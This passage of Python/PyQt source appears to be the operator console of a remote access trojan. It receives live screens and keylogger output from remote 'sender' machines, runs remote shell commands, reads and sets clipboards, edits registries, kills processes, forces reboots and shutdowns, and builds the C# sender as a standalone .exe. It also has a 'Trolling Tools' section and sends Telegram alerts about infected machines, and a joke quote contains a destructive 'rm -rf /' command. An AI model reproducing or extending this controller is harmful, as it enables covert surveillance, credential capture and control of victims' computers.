                                                    widgets['grid'].setPixmap(p.scaled(160, 90, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                                                    widgets['grid'].setText('')
                                                if 'list' in widgets:
                                                    widgets['list'].setPixmap(p.scaled(100, 56, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                                                    widgets['list'].setText('')
                                            else:
                                                # Old structure (single widget)
                                                widgets.setPixmap(p.scaled(160, 90, Qt.KeepAspectRatio, Qt.SmoothTransformation))
                                                widgets.setText('')
                                    QTimer.singleShot(0, lambda m=mid, p=pixmap: _set(m, p))
                            elif self._full_view_mode and self.stream_label:
                                # Only display if frame is from our target (avoids flicker from other machines)
                                mid = getattr(self, '_next_frame_machine_id', None)
                                if mid and mid == self.selected_sender:
                                    if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                                        self.fullscreen_stream_label.setPixmap(pixmap)
                                        self.fullscreen_stream_label.setText("")
                                    self.stream_label.setPixmap(pixmap)
                                    self.stream_label.setText("")
                                self._next_frame_machine_id = None
                        else:
                            if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                                self.fullscreen_stream_label.clear()
                                self.fullscreen_stream_label.setText("Waiting for stream...")
                            if self.stream_label is not None:
                                self.stream_label.clear()
                                self.stream_label.setText("Waiting for stream...")
                    except Exception:
                        if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                            self.fullscreen_stream_label.clear()
                            self.fullscreen_stream_label.setText("Waiting for stream...")
                        if self.stream_label is not None:
                            self.stream_label.clear()
                            self.stream_label.setText("Waiting for stream...")
                    continue
                try:
                    data = json.loads(message)
                except Exception:
                    continue
                msg_type = data.get('type')
                if msg_type == 'frame-from':
                    self._next_frame_machine_id = data.get('machineId')
                    continue
                if msg_type == 'command-output':
                    out = data.get('output', '')
                    req = data.get('requestId')
                    # Route keylogger requests to the keylogger window
                    if req and req.startswith('keylogger-'):
                        kw = getattr(self, 'keylogger_window', None)
                        kt = getattr(self, 'keylogger_text', None)
                        if kw is not None and kt is not None:
                            def _keylogger_recv(o=out):
                                kt.append(o)
                                # Auto-scroll to bottom
                                cursor = kt.textCursor()
                                cursor.movePosition(QTextCursor.End)
                                kt.setTextCursor(cursor)
                            QTimer.singleShot(0, _keylogger_recv)
                        continue
                    # Route taskmgr-* requests to the Task Manager window
                    if req and req.startswith('taskmgr-'):
                        tw = getattr(self, 'task_manager_window', None)
                        if tw is not None:
                            def _tm_recv(r=req, o=out):
                                tw.receive_command_output(r, o)
                            QTimer.singleShot(0, _tm_recv)
                        continue
                    # Route reg-* requests to the Registry Editor window
                    if req and req.startswith('reg-'):
                        print(f"[DEBUG] Main window received registry response: {req}")
                        rw = getattr(self, 'registry_editor_window', None)
                        if rw is not None:
                            print(f"[DEBUG] Registry editor window found, routing response")
                            def _reg_recv(r=req, d=data):
                                print(f"[DEBUG] Calling receive_registry_response for {r}")
                                rw.receive_registry_response(d)
                            QTimer.singleShot(0, _reg_recv)
                        else:
                            print(f"[DEBUG] Registry editor window not found!")
                        continue
                    if req == self._pending_command_request:
                        self._pending_command_request = None
                        def _append():
                            cur = self.shell_output.toPlainText()
                            if cur.endswith('(running...'):
                                self.shell_output.setPlainText(cur[:-12] + out)
                            else:
                                self.shell_output.append(out)
                            self.shell_output.append('')
                        QTimer.singleShot(0, _append)
                    elif req and req == getattr(self, '_fun_exec_request', None):
                        self._fun_exec_request = None
                        def _fun_append(o=out):
                            if hasattr(self, '_exec_output'):
                                cur = self._exec_output.toPlainText()
                                if cur.endswith('(running...'):
                                    self._exec_output.setPlainText(cur[:-12] + o)
                                else:
                                    self._exec_output.insertPlainText(o)
                                self._exec_output.insertPlainText('\n✔ Done')
                                self._exec_output.ensureCursorVisible()
                            if hasattr(self, '_exec_run_btn'):
                                self._exec_run_btn.setEnabled(True)
                        QTimer.singleShot(0, _fun_append)
                    continue
                if msg_type == 'clipboard-content':
                    txt = data.get('text', '')
                    req = data.get('requestId')
                    if req == self._pending_clipboard_request:
                        self._pending_clipboard_request = None
                        def _set():
                            self.clipboard_input.setText(txt)
                        QTimer.singleShot(0, _set)
                    continue
                if msg_type == 'joined':
                    self.join_confirmed = True
                    self._reconnect_delay = 1.0
                    self._reconnect_attempt = 0
                    self._set_connection_status('connected', 'waiting for stream')
                    if hasattr(self, 'selected_sender') and self.selected_sender:
                        fw = getattr(self, 'file_manager_window', None)
                        if fw is not None:
                            fw.refresh_remote_file_list()
                        self._send_stream_quality_for_sender(self.selected_sender)
                elif msg_type == 'active-machines':
                    machines = data.get('machines', [])
                    QTimer.singleShot(0, lambda m=machines: self._safe_update_senders(m))
                elif msg_type == 'system-info':
                    info = data.get('info')
                    machine_id = data.get('machineId')
                    if machine_id:
                        prev_cc = (self._machine_info.get(machine_id) or {}).get('countryCode')
                        self._machine_info[machine_id] = info
                        new_cc = (info or {}).get('countryCode')
                        # Check resource thresholds for Telegram alerts
                        if isinstance(info, dict):
                            _cpu = info.get('cpu', info.get('cpu_percent', info.get('cpuPercent')))
                            _ram = info.get('ram', info.get('ram_percent', info.get('memory_percent', info.get('memoryPercent'))))
                            try:
                                _cpu = float(str(_cpu).replace('%', '')) if _cpu is not None else None
                                _ram = float(str(_ram).replace('%', '')) if _ram is not None else None
                                self._telegram_notify_resource(machine_id, cpu=_cpu, ram=_ram)
                            except Exception:
                                pass
                        # Rebuild thumbnails when real geo data first arrives
                        if new_cc and new_cc != prev_cc:
                            QTimer.singleShot(0, self._rebuild_thumbnail_grid)
                    
                    # Target UI refreshes to specific active instances
                    if machine_id == self.selected_sender:
                        self.last_system_info = info
                        self.update_telemetry_panel()
                    
                    if hasattr(self, 'machine_telemetry_display') and self._selected_detail_machine == machine_id:
                        self.machine_telemetry_display.update_data(info)
                elif msg_type == 'sender-online':
                    machine_id = data.get('machineId')
                    QTimer.singleShot(0, lambda mid=machine_id: self._safe_add_sender(mid))
                elif msg_type == 'sender-offline':
                    machine_id = data.get('machineId')
                    QTimer.singleShot(0, lambda mid=machine_id: self._safe_remove_sender(mid))
                elif msg_type == 'motd':
                    motd_text = data.get('message', '')
                    QTimer.singleShot(0, lambda t=motd_text: self._update_motd(t))
                elif msg_type == 'chat':
                    self.chat_log.addItem(f"{data.get('user')}: {data.get('message')}")
                elif msg_type == 'telemetry':
                    self.last_telemetry = data
                    self.update_telemetry_panel()
                elif msg_type == 'stream':
                    img_data = data.get('image')
                    if img_data:
                        try:
                            img_bytes = base64.b64decode(img_data)
                            image = QImage.fromData(img_bytes)
                            if not image.isNull():
                                pixmap = QPixmap.fromImage(image)
                                if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                                    self.fullscreen_stream_label.setPixmap(pixmap)
                                    self.fullscreen_stream_label.setText("")
                                if self.stream_label is not None:
                                    self.stream_label.setPixmap(pixmap)
                                    self.stream_label.setText("")
                            else:
                                if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                                    self.fullscreen_stream_label.clear()
                                    self.fullscreen_stream_label.setText("Waiting for stream...")
                                if self.stream_label is not None:
                                    self.stream_label.clear()
                                    self.stream_label.setText("Waiting for stream...")
                        except Exception as e:
                            if hasattr(self, 'fullscreen_stream_label') and self.fullscreen_stream_label is not None:
                                self.fullscreen_stream_label.clear()
                                self.fullscreen_stream_label.setText("Waiting for stream...")
                            if self.stream_label is not None:
                                self.stream_label.clear()
                                self.stream_label.setText("Waiting for stream...")
                    else:
                        self.stream_label.setText('Stream received (no image data)')
                elif msg_type in ('file-list', 'file-data'):
                    self.handle_server_message(data)
                elif msg_type == 'registry-response':
                    # Route registry responses to the Registry Editor window
                    rw = getattr(self, 'registry_editor_window', None)
                    if rw is not None:
                        def _reg_recv(d=data):
                            rw.receive_registry_response(d)
                        QTimer.singleShot(0, _reg_recv)
        except asyncio.CancelledError:
            raise
        except Exception:
            self._set_connection_status('disconnected')

    def send_kill_pid(self):
        if not self.selected_sender:
            self.show_warning('Select a sender first.')
            return
        pid = self.kill_pid_input.text().strip()
        if pid:
            asyncio.ensure_future(self.send_ws({'type': 'remote-control', 'action': 'process-kill', 'pid': pid, 'machineId': self.selected_sender}))
            self.kill_pid_input.clear()

    def send_clipboard_text(self):
        text = self.clipboard_input.text()
        if not text:
            self.show_warning('Clipboard text is empty.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before sending clipboard.')
            return
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'clipboard-text',
            'text': text,
            'machineId': self.selected_sender
        }))
        self.clipboard_input.clear()
        self.show_warning('Clipboard text sent.')

    # File transfer method removed

    async def send_ws(self, data):
        if self.ws:
            try:
                await asyncio.wait_for(
                    self.ws.send(json.dumps(data)),
                    timeout=5.0
                )
            except asyncio.TimeoutError:
                # Send timed out - WS send lock is stuck, must reconnect
                QTimer.singleShot(0, lambda: self.status_label.setText('🔴  Send timeout — reconnecting...'))
                QTimer.singleShot(0, lambda: self.status_label.setStyleSheet('color: #f87171; font-weight: bold;'))
                self.ws = None
                self._schedule_reconnect()
            except Exception:
                self.status_label.setText('Send failed')

    def _make_divider(self):
        """Return a thin horizontal line separator."""
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setStyleSheet('color: #3a3c4e; margin: 4px 0;')
        return line

    def setup_ui(self):
        # Sidebar layout organized into Tabs
        self.sidebar_tabs = QTabWidget()
        self.sidebar_tabs.setObjectName('sidebar_tabs')
        self.sidebar_tabs.setUsesScrollButtons(False)
        self.sidebar_tabs.setMinimumWidth(240)
        self.sidebar_tabs.setMaximumWidth(500)

        # 1. Connection Tab
        conn_tab = QWidget()
        conn_layout = QVBoxLayout()
        conn_layout.setSpacing(8)
        conn_layout.setContentsMargins(8, 8, 8, 8)

        # Connection header banner
        conn_header = QLabel('🔗  Connection')
        conn_header.setAlignment(Qt.AlignCenter)
        conn_header.setStyleSheet(
            'font-size: 13px; font-weight: bold; color: #818cf8;'
            'padding: 6px; background: #14151e; border: 1px solid #2e3040; border-radius: 6px;'
        )
        conn_layout.addWidget(conn_header)

        # Status row
        self.status_label.setAlignment(Qt.AlignCenter)
        self.status_label.setStyleSheet('color: #ff6b6b; font-weight: bold;')
        conn_layout.addWidget(self.status_label)

        # Active Machines group
        machines_group = QGroupBox('🖥  Active Machines')
        machines_layout = QVBoxLayout()
        machines_layout.setSpacing(6)
        self.sender_list.setMinimumHeight(28)
        self.sender_list.setStyleSheet(
            'QComboBox { background: #1a1b24; color: #e8e9f5; border: 1px solid #3a3c4e;'
            '  border-radius: 4px; padding: 4px 8px; font-size: 9pt; }'
            'QComboBox:hover { border-color: #5865F2; }'
            'QComboBox::drop-down { border: none; }'
        )
        machines_layout.addWidget(self.sender_list)
        self.selected_sender_label.setStyleSheet(
            'color: #9a9cb0; font-size: 8pt; padding: 2px 4px;'
            'background: #14151e; border-radius: 3px;'
        )
        self.selected_sender_label.setWordWrap(True)
        machines_layout.addWidget(self.selected_sender_label)
        reconn_btn = QPushButton('⟳  Reconnect')
        reconn_btn.setToolTip('Reconnect to the WebSocket server')
        reconn_btn.setStyleSheet(
            'QPushButton { background: #1a2332; color: #7dd3fc; border: 1px solid #1e3a5f;'
            '  border-radius: 4px; font-size: 8pt; font-weight: bold; padding: 5px 10px; }'
            'QPushButton:hover { background: #1e3a5f; color: #bae6fd; border-color: #38bdf8; }'
        )
        reconn_btn.clicked.connect(self.reconnect)
        machines_layout.addWidget(reconn_btn)
        machines_group.setLayout(machines_layout)
        conn_layout.addWidget(machines_group)

        # Stream Settings group
        stream_group = QGroupBox('⚙  Stream Settings')
        stream_layout = QVBoxLayout()
        stream_layout.setSpacing(6)
        quality_lbl = QLabel('Quality')
        quality_lbl.setStyleSheet('color: #686a80; font-size: 8pt; font-weight: bold;')
        stream_layout.addWidget(quality_lbl)
        self.quality_combo.setMinimumHeight(28)
        stream_layout.addWidget(self.quality_combo)

        # Separator
        stream_sep = QFrame()
        stream_sep.setFrameShape(QFrame.HLine)
        stream_sep.setStyleSheet('color: #2e3040;')
        stream_layout.addWidget(stream_sep)

        self.lock_remote_check.setStyleSheet(
            'QPushButton { background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e;'
            '  border-radius: 4px; padding: 5px 10px; font-weight: bold; }'
            'QPushButton:checked { background: #4752c4; color: white; border: 1px solid #5865F2; }'
            'QPushButton:hover:!checked { background: #2a2b3d; border-color: #5865F2; }'
        )
        stream_layout.addWidget(self.lock_remote_check)
        stream_group.setLayout(stream_layout)
        conn_layout.addWidget(stream_group)
        conn_layout.addStretch()
        conn_tab.setLayout(conn_layout)

        # 2. Tools Tab
        tools_tab = QWidget()
        tools_layout = QVBoxLayout()
        tools_layout.setSpacing(8)
        tools_layout.setContentsMargins(8, 8, 8, 8)

        # Tools header banner
        tools_header = QLabel('🛠  Tools')
        tools_header.setAlignment(Qt.AlignCenter)
        tools_header.setStyleSheet(
            'font-size: 13px; font-weight: bold; color: #818cf8;'
            'padding: 6px; background: #14151e; border: 1px solid #2e3040; border-radius: 6px;'
        )
        tools_layout.addWidget(tools_header)

        # Clipboard section
        clip_group = QGroupBox('📋  Clipboard')
        clip_layout = QVBoxLayout()
        clip_layout.setSpacing(6)
        self.clipboard_input.setStyleSheet(
            'font-family: Consolas, monospace; font-size: 8pt;'
            'background: #1a1b24; color: #e8e9f5; border: 1px solid #3a3c4e;'
            'border-radius: 4px; padding: 4px 8px;'
        )
        clip_layout.addWidget(self.clipboard_input)
        clip_row = QHBoxLayout()
        clip_row.setSpacing(6)
        self.clipboard_send_btn.setStyleSheet(
            'QPushButton { background: #166534; color: #d1fae5; font-weight: bold;'
            '  border-radius: 4px; padding: 5px 10px; border: none; }'
            'QPushButton:hover { background: #15803d; }'
        )
        clip_row.addWidget(self.clipboard_send_btn)
        self.clipboard_get_btn = QPushButton('📥  Get Remote')
        self.clipboard_get_btn.setToolTip('Fetch clipboard contents from the remote machine')
        self.clipboard_get_btn.setStyleSheet(
            'QPushButton { background: #1a2332; color: #7dd3fc; font-weight: bold;'
            '  border-radius: 4px; padding: 5px 10px; border: 1px solid #1e3a5f; }'
            'QPushButton:hover { background: #1e3a5f; color: #bae6fd; }'
        )
        self.clipboard_get_btn.clicked.connect(self.get_remote_clipboard)
        clip_row.addWidget(self.clipboard_get_btn)
        clip_layout.addLayout(clip_row)
        clip_group.setLayout(clip_layout)
        tools_layout.addWidget(clip_group)

        # Shell section
        shell_group = QGroupBox('💻  Remote Shell')
        shell_layout = QVBoxLayout()
        shell_layout.setSpacing(6)
        self.shell_command_input = QLineEdit()
        self.shell_command_input.setPlaceholderText('Command (e.g. dir, ipconfig)')
        self.shell_command_input.setStyleSheet(
            'font-family: Consolas, monospace; font-size: 8pt;'
            'background: #1a1b24; color: #e8e9f5; border: 1px solid #3a3c4e;'
            'border-radius: 4px; padding: 4px 8px;'
        )
        self.shell_command_input.returnPressed.connect(self.run_remote_command)
        shell_layout.addWidget(self.shell_command_input)
        self.shell_run_btn = QPushButton('▶  Run')
        self.shell_run_btn.setStyleSheet(
            'QPushButton { background: #166534; color: #d1fae5; font-weight: bold;'
            '  border-radius: 4px; padding: 5px 10px; border: none; }'
            'QPushButton:hover { background: #15803d; }'
        )
        self.shell_run_btn.clicked.connect(self.run_remote_command)
        shell_layout.addWidget(self.shell_run_btn)
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setStyleSheet(
            'background: #0d0f14; color: #4ade80; font-family: Consolas, monospace; font-size: 8pt;'
            'border: 1px solid #3a3c4e; border-radius: 4px;'
        )
        self.shell_output.setMinimumHeight(80)
        self.shell_output.setPlaceholderText('Output appears here...')
        shell_layout.addWidget(self.shell_output)
        shell_group.setLayout(shell_layout)
        tools_layout.addWidget(shell_group)

        # Manager buttons section
        mgr_group = QGroupBox('📂  Managers')
        mgr_layout = QVBoxLayout()
        mgr_layout.setSpacing(6)

        self.file_manager_btn = QPushButton('📁  File Manager')
        self.file_manager_btn.setToolTip('Browse and transfer files on the remote machine')
        self.file_manager_btn.setStyleSheet(
            'QPushButton { background: #1a2332; color: #7dd3fc; font-weight: bold; padding: 8px;'
            '  border: 1px solid #1e3a5f; border-radius: 5px; }'
            'QPushButton:hover { background: #1e3a5f; color: #bae6fd; border-color: #38bdf8; }'
        )
        self.file_manager_btn.clicked.connect(self.open_file_manager)
        mgr_layout.addWidget(self.file_manager_btn)

        self.task_manager_btn = QPushButton('📋  Task Manager')
        self.task_manager_btn.setToolTip('View and kill remote processes')
        self.task_manager_btn.setStyleSheet(
            'QPushButton { background: #2a1a32; color: #c4b5fd; font-weight: bold; padding: 8px;'
            '  border: 1px solid #3d1e5f; border-radius: 5px; }'
            'QPushButton:hover { background: #3d1e5f; color: #e0d5ff; border-color: #8b5cf6; }'
        )
        self.task_manager_btn.clicked.connect(self.open_task_manager)
        mgr_layout.addWidget(self.task_manager_btn)

        self.registry_editor_btn = QPushButton('🗂️  Registry Editor')
        self.registry_editor_btn.setToolTip('Browse and edit Windows Registry on the remote machine')
        self.registry_editor_btn.setStyleSheet(
            'QPushButton { background: #321a2a; color: #fda4af; font-weight: bold; padding: 8px;'
            '  border: 1px solid #5f1e3d; border-radius: 5px; }'
            'QPushButton:hover { background: #5f1e3d; color: #fecdd3; border-color: #f43f5e; }'
        )
        self.registry_editor_btn.clicked.connect(self.open_registry_editor)
        mgr_layout.addWidget(self.registry_editor_btn)

        self.build_sender_btn = QPushButton('🔨  Build Sender')
        self.build_sender_btn.setToolTip('Compile the C# sender into a standalone .exe (dotnet publish)')
        self.build_sender_btn.setStyleSheet(
            'QPushButton { background: #1a2a1a; color: #86efac; font-weight: bold; padding: 8px;'
            '  border: 1px solid #1e5f2a; border-radius: 5px; }'
            'QPushButton:hover { background: #1e5f2a; color: #bbf7d0; border-color: #4ade80; }'
        )
        self.build_sender_btn.clicked.connect(self.open_build_sender_dialog)
        mgr_layout.addWidget(self.build_sender_btn)

        mgr_group.setLayout(mgr_layout)
        tools_layout.addWidget(mgr_group)
        tools_layout.addStretch()
        tools_tab.setLayout(tools_layout)

        # 3. Chat Tab
        chat_tab = QWidget()
        chat_layout = QVBoxLayout()
        chat_layout.setSpacing(8)
        chat_layout.setContentsMargins(8, 8, 8, 8)

        # Chat header banner
        chat_header = QLabel('💬  Chat')
        chat_header.setAlignment(Qt.AlignCenter)
        chat_header.setStyleSheet(
            'font-size: 13px; font-weight: bold; color: #818cf8;'
            'padding: 6px; background: #14151e; border: 1px solid #2e3040; border-radius: 6px;'
        )
        chat_layout.addWidget(chat_header)

        self.chat_log.setStyleSheet(
            'QListWidget { background: #0d0f14; border: 1px solid #3a3c4e; border-radius: 5px;'
            '  color: #d4d4d4; font-family: Consolas, monospace; font-size: 8pt; padding: 4px; }'
            'QListWidget::item { padding: 3px 4px; border-bottom: 1px solid #1a1b24; }'
            'QListWidget::item:hover { background: #1a1b24; }'
        )
        chat_layout.addWidget(self.chat_log, 1)

        # Chat input row
        chat_input_row = QHBoxLayout()
        chat_input_row.setSpacing(6)
        self.chat_input.setPlaceholderText('Type a message...')
        self.chat_input.setStyleSheet(
            'background: #1a1b24; color: #e8e9f5; border: 1px solid #3a3c4e;'
            'border-radius: 4px; padding: 6px 8px; font-size: 9pt;'
        )
        self.chat_input.returnPressed.connect(self.send_chat_message)
        chat_input_row.addWidget(self.chat_input, 1)
        self.chat_send.setMaximumWidth(70)
        self.chat_send.setStyleSheet(
            'QPushButton { background: #166534; color: #d1fae5; font-weight: bold;'
            '  border-radius: 4px; padding: 6px 10px; border: none; }'
            'QPushButton:hover { background: #15803d; }'
        )
        chat_input_row.addWidget(self.chat_send)
        chat_layout.addLayout(chat_input_row)

        # Chat hint
        chat_hint = QLabel('Press Enter or click Send to send a message')
        chat_hint.setStyleSheet('color: #4a4c5e; font-size: 7pt; font-style: italic;')
        chat_hint.setAlignment(Qt.AlignCenter)
        chat_layout.addWidget(chat_hint)

        chat_tab.setLayout(chat_layout)

        # 4. Telemetry Tab
        telem_tab = QWidget()
        telem_layout = QVBoxLayout()
        telem_layout.setContentsMargins(8, 8, 8, 8)
        telem_layout.setSpacing(8)

        # Telem header banner
        telem_header = QLabel('📊  Telemetry')
        telem_header.setAlignment(Qt.AlignCenter)
        telem_header.setStyleSheet(
            'font-size: 13px; font-weight: bold; color: #818cf8;'
            'padding: 6px; background: #14151e; border: 1px solid #2e3040; border-radius: 6px;'
        )
        telem_layout.addWidget(telem_header)

        telem_layout.addWidget(self.telemetry_panel, 1)
        self.telemetry_refresh_btn.setText('⟳  Refresh Telemetry')
        self.telemetry_refresh_btn.setStyleSheet(
            'QPushButton { background: #1a2332; color: #7dd3fc; font-weight: bold;'
            '  border-radius: 4px; padding: 6px 12px; border: 1px solid #1e3a5f; }'
            'QPushButton:hover { background: #1e3a5f; color: #bae6fd; border-color: #38bdf8; }'
        )
        telem_layout.addWidget(self.telemetry_refresh_btn)
        telem_tab.setLayout(telem_layout)

        # Add tabs
        # Wrap each tab in a QScrollArea so the sidebar can shrink vertically
        for _tab_widget, _tab_label in [
            (conn_tab, "Connect"), (tools_tab, "Tools"),
            (chat_tab, "Chat"), (telem_tab, "Telem"),
        ]:
            _scroll = QScrollArea()
            _scroll.setWidget(_tab_widget)
            _scroll.setWidgetResizable(True)
            _scroll.setFrameShape(QFrame.NoFrame)
            _scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
            self.sidebar_tabs.addTab(_scroll, _tab_label)

        # 5. Fun Tab
        fun_tab = QWidget()
        fun_layout = QVBoxLayout()
        fun_layout.setContentsMargins(8, 8, 8, 8)
        fun_layout.setSpacing(8)

        # Matrix rain
        self._matrix_widget = MatrixRainWidget()
        self._matrix_widget.setMinimumHeight(80)
        self._matrix_widget.setMaximumHeight(180)
        fun_layout.addWidget(self._matrix_widget)

        # Uptime counter
        self._fun_start_time = time.time()
        self._uptime_label = QLabel('⏱  Session uptime: 0s')
        self._uptime_label.setAlignment(Qt.AlignCenter)
        self._uptime_label.setStyleSheet(
            'color: #4ade80; font-family: Consolas, monospace; font-size: 9pt;'
        )
        fun_layout.addWidget(self._uptime_label)

        # Hacker quote
        _quotes = [
            '"Hack the planet!" — Hackers (1995)',
            '"The quieter you become, the more you can hear." — BackTrack',
            '"There is no patch for human stupidity."',
            '"The best way to predict the future is to invent it." — Alan Kay',
            '"It\'s not a bug, it\'s an undocumented feature."',
            '"Security is a process, not a product." — Bruce Schneier',
            '"Complexity is the enemy of security."',
            '"Trust, but verify."',
            '"All your base are belong to us." — CATS',
            '"With great power comes great responsibility."',
            '"rm -rf / — don\'t try this at home."',
            '"sudo make me a sandwich." — xkcd',
            '"There are only 10 types of people..." — Binary joke',
            '"Premature optimisation is the root of all evil." — Knuth',
            '"Any sufficiently advanced technology is indistinguishable from magic." — Clarke',
        ]
        self._quotes = _quotes
        self._quote_idx = random.randint(0, len(_quotes) - 1)

        quote_group = QGroupBox('💬  Hacker Quote')
        quote_vlayout = QVBoxLayout()
        self._quote_label = QLabel()
        self._quote_label.setWordWrap(True)
        self._quote_label.setAlignment(Qt.AlignCenter)
        self._quote_label.setStyleSheet(
            'color: #818cf8; font-style: italic; font-size: 8pt; padding: 4px;'
        )
        self._quote_label.setText(self._quotes[self._quote_idx])
        quote_vlayout.addWidget(self._quote_label)
        next_quote_btn = QPushButton('🎲  Next Quote')
        next_quote_btn.setStyleSheet(
            'background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; font-size: 8pt; padding: 4px;'
        )
        next_quote_btn.clicked.connect(self._next_hacker_quote)
        quote_vlayout.addWidget(next_quote_btn)
        quote_group.setLayout(quote_vlayout)
        fun_layout.addWidget(quote_group)

        # Quick Launcher section
        launch_group = QGroupBox('⚡  Remote Launcher')
        launch_vlayout = QVBoxLayout()
        launch_vlayout.setSpacing(5)

        # Path input + browse row
        path_row = QHBoxLayout()
        self._exec_path_input = QLineEdit()
        self._exec_path_input.setPlaceholderText('Command to run on remote...')
        self._exec_path_input.setStyleSheet('font-family: Consolas, monospace; font-size: 8pt;')
        self._exec_path_input.returnPressed.connect(self._run_local_exec)
        path_row.addWidget(self._exec_path_input, 1)
        browse_btn = QPushButton('\ud83d\udcc2')
        browse_btn.setMaximumWidth(30)
        browse_btn.setToolTip('Browse for executable')
        browse_btn.setStyleSheet('background: #22232d; border: 1px solid #3a3c4e; padding: 3px;')
        browse_btn.clicked.connect(self._browse_local_exec)
        path_row.addWidget(browse_btn)
        launch_vlayout.addLayout(path_row)

        # Run / Stop buttons
        run_row = QHBoxLayout()
        self._exec_run_btn = QPushButton('▶  Run on Remote')
        self._exec_run_btn.setStyleSheet(
            'background: #166534; color: #d1fae5; font-weight: bold; border-radius: 4px; padding: 4px 10px;'
        )
        self._exec_run_btn.clicked.connect(self._run_local_exec)
        run_row.addWidget(self._exec_run_btn)
        self._exec_stop_btn = QPushButton('✕  Clear')
        self._exec_stop_btn.setStyleSheet(
            'background: #2a2b38; color: #9a9cb0; border: 1px solid #3a3c4e; border-radius: 4px; padding: 4px 10px;'
        )
        self._exec_stop_btn.setEnabled(True)
        self._exec_stop_btn.clicked.connect(lambda: self._exec_output.clear() if hasattr(self, '_exec_output') else None)
        run_row.addWidget(self._exec_stop_btn)
        launch_vlayout.addLayout(run_row)

        # Output area
        self._exec_output = QTextEdit()
        self._exec_output.setReadOnly(True)
        self._exec_output.setMaximumHeight(90)
        self._exec_output.setStyleSheet(
            'background: #0d0f14; color: #4ade80; font-family: Consolas, monospace;'
            'font-size: 8pt; border: 1px solid #3a3c4e; border-radius: 4px;'
        )
        self._exec_output.setPlaceholderText('Output appears here...')
        launch_vlayout.addWidget(self._exec_output)

        # Custom shortcuts section
        shortcuts_header = QHBoxLayout()
        shortcuts_lbl = QLabel('Quick Launch:')
        shortcuts_lbl.setStyleSheet('color: #686a80; font-size: 8pt;')
        shortcuts_header.addWidget(shortcuts_lbl)
        shortcuts_header.addStretch()
        add_shortcut_btn = QPushButton('\u2795 Add')
        add_shortcut_btn.setStyleSheet(
            'background: #1e1f2a; color: #818cf8; border: 1px solid #3a3c4e;'
            'border-radius: 4px; font-size: 8pt; padding: 3px 8px;'
        )
        add_shortcut_btn.setToolTip('Add a custom shortcut')
        add_shortcut_btn.clicked.connect(self._add_custom_shortcut)
        shortcuts_header.addWidget(add_shortcut_btn)
        launch_vlayout.addLayout(shortcuts_header)

        self._shortcut_grid_layout = QGridLayout()
        self._shortcut_grid_layout.setSpacing(4)
        self._shortcut_grid_widget = QWidget()
        self._shortcut_grid_widget.setLayout(self._shortcut_grid_layout)
        launch_vlayout.addWidget(self._shortcut_grid_widget)

        # Load saved shortcuts (or defaults on first run)
        self._shortcuts: list = self._load_shortcuts()
        self._rebuild_shortcut_grid()
        launch_group.setLayout(launch_vlayout)
        fun_layout.addWidget(launch_group)

        self._local_process: typing.Any = None

        # ── Remote Power Control ──
        power_group = QGroupBox('⚡  Remote Power Control')
        power_vlayout = QVBoxLayout()
        power_vlayout.setSpacing(6)

        power_desc = QLabel('Send power commands to the selected remote machine.')
        power_desc.setStyleSheet('color: #686a80; font-size: 8pt;')
        power_desc.setWordWrap(True)
        power_vlayout.addWidget(power_desc)

        power_grid = QGridLayout()
        power_grid.setSpacing(6)

        self._power_lock_btn = QPushButton('🔒  Lock')
        self._power_lock_btn.setToolTip('Lock the remote workstation (Win+L)')
        self._power_lock_btn.setStyleSheet(
            'QPushButton { background: #1e1f2a; color: #818cf8; border: 1px solid #3a3c4e;'
            '  border-radius: 5px; padding: 8px 6px; font-weight: bold; font-size: 9pt; }'
            'QPushButton:hover { background: #2a2b3d; border-color: #5865F2; }'
        )
        self._power_lock_btn.clicked.connect(lambda: self._send_power_action('lock'))
        power_grid.addWidget(self._power_lock_btn, 0, 0)

        self._power_logoff_btn = QPushButton('🚪  Log Off')
        self._power_logoff_btn.setToolTip('Log off the current user on the remote machine')
        self._power_logoff_btn.setStyleSheet(
            'QPushButton { background: #1e1f2a; color: #f59e0b; border: 1px solid #3a3c4e;'
            '  border-radius: 5px; padding: 8px 6px; font-weight: bold; font-size: 9pt; }'
            'QPushButton:hover { background: #2a2b3d; border-color: #f59e0b; }'
        )
        self._power_logoff_btn.clicked.connect(lambda: self._send_power_action('logoff'))
        power_grid.addWidget(self._power_logoff_btn, 0, 1)

        self._power_reboot_btn = QPushButton('🔄  Reboot')
        self._power_reboot_btn.setToolTip('Immediately reboot the remote machine')
        self._power_reboot_btn.setStyleSheet(
            'QPushButton { background: #1e1f2a; color: #f97316; border: 1px solid #3a3c4e;'
            '  border-radius: 5px; padding: 8px 6px; font-weight: bold; font-size: 9pt; }'
            'QPushButton:hover { background: #3d2010; border-color: #f97316; }'
        )
        self._power_reboot_btn.clicked.connect(lambda: self._send_power_action('reboot'))
        power_grid.addWidget(self._power_reboot_btn, 1, 0)

        self._power_shutdown_btn = QPushButton('⏻  Shutdown')
        self._power_shutdown_btn.setToolTip('Immediately shut down the remote machine')
        self._power_shutdown_btn.setStyleSheet(
            'QPushButton { background: #1e1f2a; color: #ef4444; border: 1px solid #3a3c4e;'
            '  border-radius: 5px; padding: 8px 6px; font-weight: bold; font-size: 9pt; }'
            'QPushButton:hover { background: #3d1010; border-color: #ef4444; }'
        )
        self._power_shutdown_btn.clicked.connect(lambda: self._send_power_action('shutdown'))
        power_grid.addWidget(self._power_shutdown_btn, 1, 1)

        power_vlayout.addLayout(power_grid)
        power_group.setLayout(power_vlayout)
        fun_layout.addWidget(power_group)

        # ── Trolling Tools ──
        troll_group = QGroupBox('😈  Trolling Tools')
        troll_vlayout = QVBoxLayout()
        troll_vlayout.setSpacing(6)

        troll_desc = QLabel('Harmless pranks for the selected remote machine.')
